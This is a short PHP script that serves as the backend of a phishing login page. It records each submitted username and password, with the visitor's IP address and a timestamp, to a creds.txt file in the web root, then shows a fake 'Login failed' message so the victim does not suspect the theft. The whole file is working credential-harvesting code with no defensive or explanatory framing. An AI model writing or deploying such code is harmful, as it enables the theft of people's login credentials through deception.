<?php
$date = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$username = $_POST['username'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$log = "[$date] IP: $ip | USERNAME: $username | PASSWORD: $password\n";
file_put_contents("/var/www/html/creds.txt", $log, FILE_APPEND | LOCK_EX);
echo "<h2>Login failed. Please try again later.</h2>";
?>
